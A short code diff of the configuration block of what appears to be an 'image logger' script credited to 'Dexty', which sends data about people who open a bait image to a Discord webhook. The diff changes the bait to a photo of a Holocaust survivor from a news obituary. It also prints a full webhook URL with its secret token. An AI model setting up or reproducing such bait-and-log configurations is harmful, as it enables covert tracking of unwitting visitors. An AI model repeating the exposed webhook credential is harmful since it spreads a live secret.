@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1519327260602269726/AJFDURfmMF6i-J93TWRplkC5o2-y36wQSYeL-NpovzMK0nXXRQmcxLv0sBYw3KTn3qtN",
-    "image": "https://www.der-loewe.info/nachruf-wolfenbuettler-holocaust-zeitzeugin-laura-eppy-verstorben", # You can also have a custom image by using a URL argument
+    "image": "https://www.der-loewe.info/wp-content/uploads/2022/10/Holocaust-Zeitzeugin-Laury-Eppy.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
